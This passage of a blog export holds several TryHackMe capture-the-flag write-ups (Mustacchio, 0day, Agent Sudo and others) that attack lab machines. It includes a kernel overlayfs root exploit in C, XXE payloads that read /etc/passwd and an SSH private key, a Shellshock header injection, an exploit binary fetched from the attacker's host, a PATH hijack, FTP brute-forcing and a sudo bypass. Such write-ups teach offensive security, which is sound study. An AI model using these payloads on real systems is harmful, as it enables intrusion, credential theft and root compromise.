(unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) err(1, \u0026quot;unshare\u0026quot;); xwritefile(\u0026quot;/proc/self/setgroups\u0026quot;, \u0026quot;deny\u0026quot;); sprintf(buf, \u0026quot;0 %d 1\u0026quot;, uid); xwritefile(\u0026quot;/proc/self/uid_map\u0026quot;, buf); sprintf(buf, \u0026quot;0 %d 1\u0026quot;, gid); xwritefile(\u0026quot;/proc/self/gid_map\u0026quot;, buf); sprintf(buf, \u0026quot;lowerdir=%s,upperdir=%s,workdir=%s\u0026quot;, DIR_LOWER, DIR_UPPER, DIR_WORK); if (mount(\u0026quot;overlay\u0026quot;, DIR_MERGE, \u0026quot;overlay\u0026quot;, 0, buf) == -1) err(1, \u0026quot;mount %s\u0026quot;, DIR_MERGE); // all+ep char cap[] = \u0026quot;\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\u0026quot;; xcopyfile(\u0026quot;/proc/self/exe\u0026quot;, BIN_MERGE, 0777); if (setxattr(BIN_MERGE, \u0026quot;security.capability\u0026quot;, cap, sizeof(cap) - 1, 0) == -1) err(1, \u0026quot;setxattr %s\u0026quot;, BIN_MERGE); return 0; } int main(int argc, char *argv[]) { if (strstr(argv[0], \u0026quot;magic\u0026quot;) || (argc \u0026gt; 1 \u0026amp;\u0026amp; !strcmp(argv[1], \u0026quot;shell\u0026quot;))) { setuid(0); setgid(0); execl(\u0026quot;/bin/bash\u0026quot;, \u0026quot;/bin/bash\u0026quot;, \u0026quot;--norc\u0026quot;, \u0026quot;--noprofile\u0026quot;, \u0026quot;-i\u0026quot;, NULL); err(1, \u0026quot;execl /bin/bash\u0026quot;); } pid_t child = fork(); if (child == -1) err(1, \u0026quot;fork\u0026quot;); if (child == 0) { _exit(exploit()); } else { waitpid(child, NULL, 0); } execl(BIN_UPPER, BIN_UPPER, \u0026quot;shell\u0026quot;, NULL); err(1, \u0026quot;execl %s\u0026quot;, BIN_UPPER); } EOF sys-internal@vulnnet-internal:~$ gcc xpl.c sys-internal@vulnnet-internal:~$ ./a.out bash-4.4# And we are done!\n","date":"2021-06-17T00:00:00Z","image":"https://i.imgur.com/3ec8CfD.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-vulnnet-internal-writeup/","title":"TryHackMe: VulnNet Internal Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d3:9e:50:66:5f:27:a0:60:a7:e8:8b:cb:a9:2a:f0:19 (RSA) | 256 5f:98:f4:5d:dc:a1:ee:01:3e:91:65:0a:80:52:de:ef (ECDSA) |_ 256 5e:17:6e:cd:44:35:a8:0b:46:18:cb:00:8d:49:b3:f6 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Mustacchio | Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Info Gathered:\n SSH open on 22 Post 80 with a website open  More information gathered later, as the full port scan takes a lot longer.\nNot shown: 65532 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8765/tcp open ultraseek-http We could explore the last port later.\n1.2. Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -u 10.10.247.224 /images (Status: 301) [Size: 315] [--\u0026gt; http://10.10.247.224/images/] /about.html (Status: 200) [Size: 3152] /contact.html (Status: 200) [Size: 1450] /index.html (Status: 200) [Size: 1752] /blog.html (Status: 200) [Size: 3172] /gallery.html (Status: 200) [Size: 1950] /custom (Status: 301) [Size: 315] [--\u0026gt; http://10.10.247.224/custom/] /robots.txt (Status: 200) [Size: 28] /fonts (Status: 301) [Size: 314] [--\u0026gt; http://10.10.247.224/fonts/] /server-status (Status: 403) [Size: 278] Info gathered:\n custom looks interesting robots.txt usually contains intersting information  1.3. Web Exploration The homepage. We explore the /custom/ page, and get another /js/ directory onwards. I first looked in users.bak. We get something interesting!\n┌──(kali㉿kali)-[/tmp] └─$ cat users.bak ��r�CtableusersusersCREATE TABLE \u0026quot;users\u0026quot; ( \u0026quot;id\u0026quot; INTEGER, \u0026quot;username\u0026quot; TEXT, \u0026quot;password\u0026quot; TEXT, \u0026quot;role\u0026quot; INTEGER ��2 ]admin{hash_was_here_and_i_hid_it_lol} 1.4. Hash Cracking Looks like a hash for the username admin. But, of what kind?\n┌──(kali㉿kali)-[/tmp] └─$ hashid {hash_was_here_and_i_hid_this_too} Analyzing '{yeee_hawww}' [+] SHA-1 [+] Double SHA-1 [+] RIPEMD-160 [+] Haval-160 [+] Tiger-160 [+] HAS-160 [+] LinkedIn [+] Skein-256(160) [+] Skein-512(160) Using john the ripper, we get the password XD\n┌──(kali㉿kali)-[/tmp] └─$ ssh admin@10.10.247.224 The authenticity of host '10.10.247.224 (10.10.247.224)' can't be established. ECDSA key fingerprint is SHA256:g//RSEsVCZF6FIydF0R24Gmek8fI6D7kRnDXF3fNK9Y. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.247.224' (ECDSA) to the list of known hosts. admin@10.10.247.224: Permission denied (publickey). And \u0026hellip; we see that we are not allowed :( At this point, we have one last option left.\n1.5. The Mystery Port \u0026amp; Our Key to Success Exploring the last port, we get some more information.\nPORT STATE SERVICE VERSION 8765/tcp open http nginx 1.10.3 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST |_http-server-header: nginx/1.10.3 (Ubuntu) |_http-title: Mustacchio | Login Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Let\u0026rsquo;s go!\nWe see an admin panel! Recall, we already have the credentials :D\nWe see the following in the source code. \u0026lt;!-- Barry, you can now SSH in using your key!--\u0026gt;\nNow what?\n1.6. XML I opened up burp-suite, and I got the following.\nPOST /home.php HTTP/1.1 Host: 10.10.247.224:8765 ... Connection: close xml=wow We have a comment box that looks like a place to enter XML text, as we see in the POST request.\nLet\u0026rsquo;s try:\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;root\u0026gt; \u0026lt;author\u0026gt;hacc\u0026lt;/author\u0026gt; \u0026lt;name\u0026gt;Hackerman\u0026lt;/name\u0026gt; \u0026lt;/root\u0026gt; Ey, Voila!\nI looked around, and I got OWASP XXE.\nNow, we can craft a special tasty XXE attack.\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;!DOCTYPE author [\u0026lt;!ENTITY read SYSTEM 'file:///etc/passwd'\u0026gt;]\u0026gt; \u0026lt;root\u0026gt;\u0026lt;author\u0026gt;\u0026amp;read;\u0026lt;/author\u0026gt;\u0026lt;/root\u0026gt; Explaination:\n The first line is prolog The second line specifies something of author, containing the information of the system file /etc/passwd in a variable called read. When we ask to display the author, we can put the \u0026amp;read; in between the tags. This then prints the desired output.  1.7. SSH Keys Using the above listing, we find two users, joe and barry. We see the hint given to us in the source code, to login SSH using Barry as username.\nWe can modify the request as such:\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;!DOCTYPE author [\u0026lt;!ENTITY read SYSTEM 'file:///home/barry/.ssh/id_rsa'\u0026gt;]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;author\u0026gt;\u0026amp;read;\u0026lt;/author\u0026gt; \u0026lt;/root\u0026gt; And we can get the private key! Use chmod 600 id_rsa to assign appropriate permissions.\n2. Foothold Trying the key, we see that we need a passphrase. We can use ssh2john for this.\n┌──(kali㉿kali)-[/tmp] └─$ locate ssh2john /usr/share/john/ssh2john.py ┌──(kali㉿kali)-[/tmp] └─$ /usr/share/john/ssh2john.py id_rsa \u0026gt; hash ┌──(kali㉿kali)-[/tmp] └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 6 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status {passphrase} (id_rsa) 1g 0:00:00:03 DONE (2021-06-12 10:53) 0.2754g/s 3950Kp/s 3950Kc/s 3950KC/s 1990..*7¡Vamos! Session completed Let\u0026rsquo;s login!\n┌──(kali㉿kali)-[/tmp] └─$ ssh -i id_rsa barry@10.10.237.166 Enter passphrase for key 'id_rsa': Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 13 packages can be updated. 10 of these updates are security updates. To see these additional updates run: apt list --upgradable Last login: Sat Jun 12 13:20:56 2021 from 10.17.8.184 barry@mustacchio:~$ 3. PrivEsc Okay now what? Sudo we can\u0026rsquo;t touch. Crontab empty. Linux kernel tip top. SUID?\nbarry@mustacchio:~$ find / -type f -perm -u=s 2\u0026gt; /dev/null /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/snapd/snap-confine /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/passwd /usr/bin/pkexec /usr/bin/chfn /usr/bin/newgrp /usr/bin/at /usr/bin/chsh /usr/bin/newgidmap /usr/bin/sudo /usr/bin/newuidmap /usr/bin/gpasswd /home/joe/live_log /bin/ping /bin/ping6 /bin/umount /bin/mount /bin/fusermount /bin/su Okay. So, home/joe/live_log shows us the following.\nbarry@mustacchio:~$ file /home/joe/live_log /home/joe/live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped Okay, let\u0026rsquo;s execute.\nbarry@mustacchio:~$ /home/joe/live_log 10.17.8.184 - - [12/Jun/2021:09:09:41 +0000] \u0026quot;POST /home.php HTTP/1.1\u0026quot; 200 1123 \u0026quot;http://mustacchio.thm:8765/home.php\u0026quot; \u0026quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\u0026quot; 10.17.8.184 - - [12/Jun/2021:09:09:47 +0000] \u0026quot;POST /home.php HTTP/1.1\u0026quot; 200 1123 \u0026quot;http://mustacchio.thm:8765/home.php\u0026quot; \u0026quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\u0026quot; ... ^CLive Nginx Log It says it is Live Nginx Log. We clearly need more information. What about the strings in the executable?\n... Live Nginx Log Reader tail -f /var/log/nginx/access.log ... crtstuff.c ... demo.c ... Looks closely! We have tail present. This is now a simle PATH epxloit. 2 Simple steps.\n We add the current path in the PATH environment variable. We create an executable called tail  Step 1:\nbarry@mustacchio:~$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin barry@mustacchio:~$ export PATH=$PWD:$PATH barry@mustacchio:~$ echo $PATH /home/barry:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin Step 2:\nbarry@mustacchio:~$ cat tail #!/usr/bin/python3 import pty pty.spawn(\u0026quot;/bin/bash\u0026quot;) barry@mustacchio:~$ chmod +x tail barry@mustacchio:~$ /home/joe/live_log root@mustacchio:~# System Compromised!\n","date":"2021-06-16T00:00:00Z","image":"https://i.imgur.com/dorXlbA.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-mustacchio-writeup/","title":"TryHackMe: Mustacchio Writeup"},{"content":"A pretty easy THM room. You just need to know what to do, and the rest is a cake-walk.\nPlay\n1. Enumeration and Scanning 1.1. Web Exploration We find the /secret/ directory in the enumeration. We find a id_rsa key, in /backup/\n1.2. Web Enumeration: Nikto ┌──(kali㉿kali)-[~] └─$ nikto -h 10.10.157.88 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.157.88 + Target Hostname: 10.10.157.88 + Target Port: 80 + Start Time: 2021-05-28 04:11:18 (GMT-4) --------------------------------------------------------------------------- + Server: Apache/2.4.7 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + Uncommon header '93e4r0-cve-2014-6278' found, with contents: true + OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271). Interesting. We see a shellshock vulerability. Going to the page, we see:\n1.3. Port Scanning Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nothing too ordinary. Let\u0026rsquo;s also confirm the presence of shell-shock?\n┌──(kali㉿kali)-[/tmp] └─$ nmap -sV --script http-shellshock --script-args uri=/cgi-bin/test.cgi,cmd=ls 10.10.157.88 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 04:15 EDT Nmap scan report for 10.10.157.88 Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) | http-shellshock: | VULNERABLE: | HTTP Shellshock vulnerability | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2014-6271 | This web application might be affected by the vulnerability known | as Shellshock. It seems the server is executing commands injected | via malicious HTTP headers. | | Disclosure date: 2014-09-24 | Exploit results: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026quot;-//IETF//DTD HTML 2.0//EN\u0026quot;\u0026gt; | \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;500 Internal Server Error\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Internal Server Error\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The server encountered an internal error or | misconfiguration and was unable to complete | your request.\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Please contact the server administrator at | webmaster@localhost to inform them of the time this error occurred, | and the actions you performed just before this error.\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;More information about this error may be available | in the server error log.\u0026lt;/p\u0026gt; | \u0026lt;hr\u0026gt; | \u0026lt;address\u0026gt;Apache/2.4.7 (Ubuntu) Server at 10.10.157.88 Port 80\u0026lt;/address\u0026gt; | \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; | | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | http://seclists.org/oss-sec/2014/q3/685 |_ http://www.openwall.com/lists/oss-security/2014/09/24/10 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.64 seconds Voila! Its there. Let\u0026rsquo;s look it up.\n2. Foothold Exploit shellshock\nLet\u0026rsquo;s test this once more, just to be sure.\n┌──(kali㉿kali)-[/tmp] └─$ curl -H \u0026quot;User-agent: () { :;}; echo; echo vulnerable\u0026quot; http://10.10.157.88/cgi-bin/test.cgi vulnerable Content-type: text/html Hello World! And, putting a reverse shell \u0026hellip;.\nWe are in!\n3. PrivEsc Since we do not have the sudo password, that route is blocked. I checked the setuid bit set files - there are none. I also saw the Kernel version for fun.\nwww-data@ubuntu:/home/ryan$ uname -a uname -a Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux www-data@ubuntu:/home/ryan$ gcc --version gcc --version gcc (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4 Copyright (C) 2013 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. So we have an old kernel, which points to the overlayfs exploit. We have gcc too, so that\u0026rsquo;s great. The architecture is x64. Here is the exploit.\nStartup a server on your own machine.\n┌──(kali㉿kali)-[/tmp] └─$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.157.88 - - [28/May/2021 04:32:40] \u0026quot;GET /ofs_64 HTTP/1.1\u0026quot; 200 - Get the executable.\nwww-data@ubuntu:/tmp$ wget 10.17.8.184/ofs_64 wget 10.17.8.184/ofs_64 --2021-05-28 01:32:40-- http://10.17.8.184/ofs_64 Connecting to 10.17.8.184:80... connected. HTTP request sent, awaiting response... 200 OK Length: 886664 (866K) [application/octet-stream] Saving to: 'ofs_64' 100%[======================================\u0026gt;] 886,664 311KB/s in 2.8s 2021-05-28 01:32:44 (311 KB/s) - 'ofs_64' saved [886664/886664] www-data@ubuntu:/tmp$ Running it however, we get an error. The fixes I saw were all about getting g++ or updating the repository thingies. We do not have internet ;-; So, now what?\nChecking the PATH was the next best move. It looked shady, so I put the default ubuntu PATH as below, and \u0026hellip;\nwww-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \u0026lt;t PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin www-data@ubuntu:/tmp$ ./ofs_64 ./ofs_64 spawning threads mount #1 mount #2 child threads done /etc/ld.so.preload created creating shared library sh: 0: can't access tty; job control turned off # whoami root # System compromised!\n","date":"2021-06-15T00:00:00Z","image":"https://imgur.com/jJe7K0O.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-0day-writeup/","title":"TryHackMe: 0day Writeup"},{"content":"Play\n1. Enumeration \u0026amp; Exploration 1.1 Port Scanning ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -A 10.10.170.197 Starting Nmap 7.91 (https://nmap.org ) at 2021-05-16 00:45 EDT Nmap scan report for 10.10.170.197 Host is up (0.22s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Annoucement Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results athttps://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 86.16 seconds  None of the above stand out particularly, although we can try working on ftp first. Anonymous login is not allowed, else the scan would have returned it. We now try other routes.\n1.2 Web Exploration http://10.10.170.197/index.php is a valid page, meaning the website is built with php.\nWe also see this interesting thing here:\nDear agents, Use your own codename as user-agent to access the site. From, Agent R This is hinting us to change our user-agent, in the http requests to be R, which can be assumed to be the code-name. Fire up Burp Suite and intercept the request. Change it as such.\nGET / HTTP/1.1 Host: 10.10.170.197 Upgrade-Insecure-Requests: 1 User-Agent: R Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close This is what we get as the response,\nWhat are you doing! Are you one of the 25 employees? If not, I going to report this incident Dear agents, Use your own codename as user-agent to access the site. From, Agent R This means our hypothesis was correct. We can now add the user-agent flag in the gobuster scan (above) and run it again. However … it looks we should try exploring more names. After looking at the hint, I got the extension for my browser and tried C.\nAttention *****, Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! From, Agent R Ah so here we go!\n1.3 Port: FTP Brute-force We will now use Hydra to brute-forcing our way in, using the username we got.\n┌──(kali㉿kali)-[~] └─$ hydra -l {username} -P /usr/share/wordlists/rockyou.txt 10.10.170.197 ftp Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-16 01:22:21 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ftp://10.10.170.197:21/ [STATUS] 224.00 tries/min, 224 tries in 00:01h, 14344175 to do in 1067:17h, 16 active [21][ftp] host: 10.10.170.197 login: {username} password: {password} 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-16 01:23:37 Great! We can now log in ftp with the creds.\n1.4 FTP: Exploration ┌──(kali㉿kali)-[/tmp] └─$ ftp 10.10.170.197 Connected to 10.10.170.197. 220 (vsFTPd 3.0.3) Name (10.10.170.197:kali): {username} 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt -rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg -rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png 226 Directory send OK. ftp\u0026gt; get To_agentJ.txt ... ftp\u0026gt; get cute-alien.jpg ... ftp\u0026gt; get cutie.png ... ftp\u0026gt; 221 Goodbye. So the text file connects with what we saw earlier in the web exploration.\n┌──(kali㉿kali)-[/tmp] └─$ cat To_agentJ.txt Dear agent J, All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you. From, Agent C This clearly hints at some steganography.\n1.5 Steganography ┌──(kali㉿kali)-[/tmp] └─$ binwalk cutie.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced 869 0x365 Zlib compressed data, best compression 34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt 34820 0x8804 End of Zip archive, footer length: 22 Clearly, we have something hidden. Use the -e flag to get the zip file. We have\n┌──(kali㉿kali)-[/tmp/_cutie.png.extracted] └─$ ls 365 365.zlib 8702.zip To_agentR.txt The To_agentR.txt file is empty, but we have another zip.\n┌──(kali㉿kali)-[/tmp/_cutie.png.extracted] └─$ 7z x 8702.zip ... Enter password (will not be echoed): ERROR: Wrong password : To_agentR.txt ... So we’ll need a password first. Brute forcing time again!\n1.5 Zip: Brute-force ┌──(kali㉿kali)-[/tmp/_cutie.png.extracted] └─$ /usr/sbin/zip2john 8702.zip \u0026gt; hash ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type ┌──(kali㉿kali)-[/tmp/_cutie.png.extracted] └─$ john hash Using default input encoding: UTF-8 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x]) Will run 6 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 44 candidates buffered for the current salt, minimum 48 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist {password} (8702.zip/To_agentR.txt) 1g 0:00:00:00 DONE 2/3 (2021-05-16 01:51) 1.538g/s 75606p/s 75606c/s 75606C/s 123456..pepper1 Use the \u0026quot;--show\u0026quot; option to display all of the cracked passwords reliably Session completed This was completed fairly quickly. Extracting with the password, we get\n┌──(kali㉿kali)-[/tmp/_cutie.png.extracted] └─$ cat To_agentR.txt Agent C, We need to send the picture to {encrypted stego password was here ... } as soon as possible! By, Agent R I thew this to http://icyberchef.com/ and we have the magic option. And … voila! We have the password\n1.7 Steganography (Again) Now we can simply extract the information\n┌──(kali㉿kali)-[/tmp] └─$ steghide --extract -sf cute-alien.jpg Enter passphrase: wrote extracted data to \u0026quot;message.txt\u0026quot;. ┌──(kali㉿kali)-[/tmp] └─$ cat message.txt Hi {agent J}, Glad you find this message. Your login password is {agent J's password} Don't ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, {agent C} And we are done! This looks very much like a SSH password, let’s try logging in!\n2. Foothold For fun, I tried logging in with the agent C’s credentials in SSH, but to no avail. Back to agent J then!\n┌──(kali㉿kali)-[/tmp] └─$ ssh {agent J}@10.10.170.197 {agent J}@10.10.170.197's password: ... Last login: Tue Oct 29 14:26:27 2019 {agent J}@agent-sudo:~$ ls -la total 80 drwxr-xr-x 4 {agent J} {agent J} 4096 Oct 29 2019 . drwxr-xr-x 3 root root 4096 Oct 29 2019 .. -rw-r--r-- 1 {agent J} {agent J} 42189 Jun 19 2019 Alien_autospy.jpg -rw-r--r-- 1 {agent J} {agent J} 33 Oct 29 2019 user_flag.txt Great! We have our user flag.\nSo they want us to solve another image related challenge … but before you pack your bags, its actually fun XD\nUse netcat on your machine to listen to port 1337 and run the command nc YOUR_IP 1337 \u0026lt; Alien_autospy.jpg to send the file. Do not forget to put the output in a file like, nc -lnvp 1337 \u0026gt; brr. Now, as the hint suggests, do a Google reverse image search and look for the article by foxnews XD\n3. Privilege Escalation Okay. Time to get serious again.\n{agent J}@agent-sudo:~$ sudo -l Matching Defaults entries for {agent J} on agent-sudo: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User {agent J} may run the following commands on agent-sudo: (ALL, !root) /bin/bash So I googled the last line, and we get something interesting which we have seen before in other writeups as well. It is a security by pass exploit described here https://www.exploit-db.com/exploits/47502.\n{agent J}@agent-sudo:~$ sudo -V Sudo version 1.8.21p2 Sudoers policy plugin version 1.8.21p2 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.21p2 Looks like we have some hope!\n{agent J}@agent-sudo:~$ sudo -u#-1 /bin/bash root@agent-sudo:~# Ey, voila!\nOverall a very fun room, lots of hash cracking and brute forcing — so that you can take a quick break while these tools go brrr 😛\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/NoIdF01.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-agent-sudo-writeup/","title":"TryHackMe: Agent Sudo Writeup"},{"content":"Play\n1. Recon 1.1 Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.14.90 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 06:15 EDT Nmap scan report for 10.10.14.90 Host is up (0.20s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts [NSE: writeable] | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.150.214 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA) | 256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA) |_ 256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 3s, deviation: 0s, median: 2s |_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: anonymous | NetBIOS computer name: ANONYMOUS\\x00 | Domain name: \\x00 | FQDN: anonymous |_ System time: 2021-05-07T10:15:43+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | 